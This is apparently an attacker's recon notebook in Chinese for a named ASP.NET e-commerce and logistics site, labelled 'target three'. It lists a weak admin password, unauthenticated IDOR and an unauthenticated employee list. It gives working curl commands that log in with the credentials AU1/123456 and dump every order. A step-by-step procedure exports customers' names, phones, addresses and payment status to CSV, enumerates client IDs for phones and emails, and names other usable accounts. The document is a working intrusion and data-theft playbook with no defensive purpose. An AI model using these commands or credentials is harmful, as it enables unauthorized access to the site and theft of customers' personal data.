## 目标三：jpvapou.com（ASP.NET MVC 电商/物流后台）

### 基础信息
- 主站：http://www.jpvapou.com
- 技术栈：ASP.NET MVC 5.2 + IIS 10 + Vue/Element UI
- 客户端登录：`POST /Client/ClientLogin`（字段 `Uid` + `Pwd`，需 `__RequestVerificationToken`）
- 后台登录：`POST /Admin/AdminLogin`（JSON：`{"Uid":"...","Pwd":"..."}`）
- Cookie：客户端 `ClientInfo`；后台 `PersonnelInfo`

### 漏洞清单
| 严重度 | 漏洞 | 端点 |
|--------|------|------|
| 严重 | 后台弱口令 | `POST /Admin/AdminLogin` |

| 高危 | 未授权 IDOR | `GET /Client/GetClientInfoByID?ID=` 无需 Cookie |
| 高危 | 未授权员工枚举 | `GET /Admin/GetEmployeeList` 无需 Cookie |

| 高危 | 水平越权 | 客户端 Cookie 下遍历任意 `ID` 读客户资料 |

### 关键 API
```
# 后台登录
curl -sS -X POST "http://www.jpvapou.com/Admin/AdminLogin" \
  -H "Content-Type: application/json" \
  -d '{"Uid":"AU1","Pwd":"123456"}' -c /tmp/jpv_admin.txt

# 全量订单（分页 PageCount=200）
curl -sS -X POST "http://www.jpvapou.com/Admin/GetOrderDetailByMainOrder" \
  -b /tmp/jpv_admin.txt -H "Content-Type: application/json" \
  -d '{"WareHouse":"","IsCancelOrder":0,"LogisticsState":0,"Condition":0,"MainBillCode":[],"TimeType":0,"IsDeliver":0,"StartTime":"","EndTime":"","ReceiveName":"","Page":1,"PageCount":200,"FindByCode":true}'

# 未授权读客户（无需 Cookie）
curl -sS "http://www.jpvapou.com/Client/GetClientInfoByID?ID=4"

# 客户列表（需后台 Cookie）
curl -sS -X POST "http://www.jpvapou.com/Admin/GetClient" \
  -b /tmp/jpv_admin.txt -H "Content-Type: application/json" \
  -d '{"Page":1,"PageCount":500}'
```

### 字段映射（导出标准格式）
| 列名 | API 字段 | 备注 |
|------|----------|------|
| 订单号 | MainBillCode |  fallback: ClientOrderCode / ID |
| 客户ID | ClientUid → clients.json 映射 | 非 Account 字段 |
| 收货人 | ReceiveName | |
| 电话 | ReceivePhoneNo | |
| 地址 | ReceiveAddress | |
| 国家/城市 | CountryName + CityName | 格式：`澳大利亚/{CityName}` |
| 金额(澳元) | Receivables | fallback: GoodsItems.Money 求和 |
| 支付 | PayStateName | 含「已付」→ 显示「已付」 |
| 发货 | IsDeliver | 0=未发，1/2=已发 |
| 下单时间 | CreateTime | |
| 商品摘要 | GoodsName | 将 ` * ` 替换为 ` x` |

### 标准导出列
```
订单号,客户ID,收货人,电话,地址,国家/城市,金额(澳元),支付,发货,下单时间,商品摘要
```

### 操作流程（推荐）
1. `POST /Admin/AdminLogin` 用 AU1/123456 拿 `PersonnelInfo` Cookie
2. 循环 `POST /Admin/GetOrderDetailByMainOrder` 分页拉全量（PageCount=200，无日期过滤；日期参数 StartTime/EndTime 不可靠）
3. 按字段映射生成 CSV（utf-8-sig）+ XLSX
4. 补充未授权接口：`GetClientInfoByID` 遍历 ID 1-100 拿客户电话/邮箱
5. 结果存 `/data/recon/jpvapou.com/data/`

### 注意事项
- 登录 POST 后跟随重定向可能 411，需带 `Content-Length` 或单独用 Cookie 访问
- `test` 账号可能随时失效，优先用 AU1/xu007/abc/test2
- 日期筛选参数无效，按 CreateTime 本地过滤
- 全量为每次重新导出，不支持增量 API
- 商品摘要为英文（API 原始 GoodsName），非后台中文界面
